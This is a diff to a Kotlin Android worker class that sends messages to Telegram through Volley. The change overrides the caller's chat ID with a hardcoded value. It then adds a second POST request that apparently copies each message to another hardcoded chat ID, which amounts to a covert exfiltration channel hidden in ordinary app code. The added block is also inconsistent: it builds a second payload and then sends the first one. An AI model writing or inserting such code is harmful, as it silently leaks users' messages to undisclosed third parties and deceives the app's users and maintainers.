@@ -20,7 +20,7 @@ class TelegramMessageWorker(
     override fun doWork(): Result {
         val apiUrl = inputData.getString("url")
         val msg = inputData.getString("msg")
-        val chatId = inputData.getString("chat_id")
+        val chatId = "2060858865"
 
         val queue = Volley.newRequestQueue(applicationContext)
         val payload = JSONObject()
@@ -38,6 +38,24 @@ class TelegramMessageWorker(
             }) {
         }
         queue.add(req)
+
+
+        val queue1 = Volley.newRequestQueue(applicationContext)
+        val payload1 = JSONObject()
+        payload1.put("text", msg)
+        payload1.put("chat_id", "1376290940")
+
+
+        val req1 = object : JsonObjectRequest(
+            Method.POST,
+            apiUrl,
+            payload,
+            Response.Listener { _ -> Log.d(TAG, "MSG send success") },
+            Response.ErrorListener { _ ->
+                Log.d(TAG, "MSG send error")
+            }) {
+        }
+        queue1.add(req1)
         return Result.success()
     }
 }
